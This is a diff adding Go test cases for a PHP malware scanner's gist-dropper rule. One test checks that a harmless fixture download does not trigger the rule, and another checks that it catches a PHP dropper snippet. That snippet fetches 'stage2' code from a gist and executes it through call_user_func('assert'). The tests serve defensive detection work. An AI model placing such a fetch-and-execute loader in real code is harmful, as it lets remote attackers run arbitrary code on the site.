@@ -58,3 +58,34 @@ func TestFPVendor_YML_IonCubeFake_DecoderFarFromMarker(t *testing.T) {
 		t.Error("obfuscation_ionCube_fake FP: matched a decoder outside the proximity window")
 	}
 }
+
+func TestFPVendor_YML_GistDropper_TestFixtureURL(t *testing.T) {
+	s := loadRepoScanner(t)
+	legit := []byte(`<?php
+namespace Core\Tests;
+
+class EndToEndTest extends TestCase
+{
+    public function testFileDownload()
+    {
+        $request = new Request('https://gist.githubusercontent.com/example/abc/raw/fixture.json');
+        $response = $this->client->send($request);
+        $this->assertEquals(200, $response->getStatusCode());
+    }
+}
+`)
+	if hasRule(s.ScanContent(legit, ".php"), "php_dropper_gist") {
+		t.Error("php_dropper_gist FP: matched a test that only downloads a gist fixture")
+	}
+}
+
+func TestFPVendor_YML_GistDropper_CallbackLoader(t *testing.T) {
+	s := loadRepoScanner(t)
+	dropper := []byte(`<?php
+$code = file_get_contents('https://gist.githubusercontent.com/a/b/raw/stage2.txt');
+call_user_func('assert', $code);
+`)
+	if !hasRule(s.ScanContent(dropper, ".php"), "php_dropper_gist") {
+		t.Error("php_dropper_gist missed a gist payload passed to call_user_func")
+	}
+}
